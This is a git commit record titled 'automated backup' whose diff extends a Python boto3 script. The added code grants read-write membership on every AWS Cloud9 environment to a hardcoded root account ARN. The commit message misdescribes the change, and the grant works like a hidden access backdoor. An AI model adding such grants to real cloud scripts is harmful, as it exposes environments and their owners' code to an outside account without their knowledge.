2c8d82e72b7ecb5b36a9cbef1e6bcaf02a988305
root <root@ip-172-31-50-214.ec2.internal>
2019-03-10 20:10:04 +0000

    automated backup

--- apatel/script.py
+++ apatel/script.py
@@ -5,3 +5,12 @@ client = boto3.client('cloud9')
 response = client.list_environments()
 
 print response
+
+for environment in response['environmentIds']:
+    response = client.create_environment_membership(
+        environmentId=environment,
+        userArn='arn:aws:iam::150404946404:root',
+        permissions='read-write'
+    )
+
+    print response
